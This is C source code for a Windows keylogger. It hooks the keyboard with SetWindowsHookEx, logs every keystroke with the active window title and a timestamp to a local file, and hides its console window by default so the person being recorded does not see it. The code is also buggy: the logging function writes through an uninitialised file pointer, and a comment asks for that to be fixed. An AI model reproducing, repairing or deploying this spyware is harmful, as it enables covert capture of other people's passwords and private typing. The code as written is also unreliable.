#define UNICODE 
#include <stdio.h>
#include <stdlib.h> //not sure if I used this to lazy to check back through now maybe later
#include <windows.h>
#include <time.h>
#include <string.h>
#include <stdbool.h>

#define hiden    //hiden/visable

const char* keyname[] = {
     [VK_BACK] = "[BACKSPACE]",
    [VK_RETURN] = "\n",
    [VK_SPACE] = "_",
    [VK_TAB] = "[TAB]",
    [VK_SHIFT] = "[SHIFT]",
    [VK_LSHIFT] = "[LSHIFT]",
    [VK_RSHIFT] = "[RSHIFT]",
    [VK_CONTROL] = "[CONTROL]",
    [VK_LCONTROL] = "[LCONTROL]",
    [VK_RCONTROL] = "[RCONTROL]",
    [VK_MENU] = "[ALT]",
    [VK_LWIN] = "[LWIN]",
    [VK_RWIN] = "[RWIN]",
    [VK_ESCAPE] = "[ESCAPE]",
    [VK_END] = "[END]",
    [VK_HOME] = "[HOME]",
    [VK_LEFT] = "[LEFT]",
    [VK_RIGHT] = "[RIGHT]",
    [VK_UP] = "[UP]",
    [VK_DOWN] = "[DOWN]",
    [VK_PRIOR] = "[PG_UP]",
    [VK_NEXT] = "[PG_DOWN]",
    [VK_OEM_PERIOD] = ".",
    [VK_DECIMAL] = ".",
    [VK_OEM_PLUS] = "+",
    [VK_OEM_MINUS] = "-",
    [VK_ADD] = "+",
    [VK_SUBTRACT] = "-",
    [VK_CAPITAL] = "[CAPSLOCK]"
};
HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN)
        {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            save(kbdStruct.vkCode);
        }
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int save(int key_stroke) {
    FILE* output_file;
    char output[1024];
    static char lastwindow[256] = "";
    if ((key_stroke == 1) || (key_stroke == 2))
    {
        return 0;
    }

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;
    if (foreground)
    {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }
    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);
        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            struct tm tm_info;
            time_t t = time(NULL);
            localtime_s(&tm_info, &t);
            char s[64];
            strftime(s, sizeof(s), "%FT%X%z", &tm_info);
            sprintf_s(output, "\n\n[Window: %s - at %s] ", window_title, s);
            fputs(output, output_file);
        }
    }
    if (keyname[key_stroke] != NULL)
    {
        sprintf_s(output, "%s", keyname[key_stroke]);
    }
    else
    {
        char key;
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
        if (!lowercase)
        {
            key = tolower(key);
        }
        sprintf_s(output, "%c", key);
    }
    fputs(output, output_file);
    fflush(output_file);
    printf("%s", output);
    return 0;
}

void Stealth() {
    #if defined visible
        ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
    #endif
    #if defined hiden
        ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
        FreeConsole();
    #endif
}

int main() {
    Stealth();
    
    const char* keylog = "log";
    printf("Logging output to %s\n", keylog);
    FILE* output_file = fopen(keylog, "a"); //please fix this it's not working :(
    
    SetHook();
    
    MSG msg; 
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }

    fclose(output_file);
    return 0;
}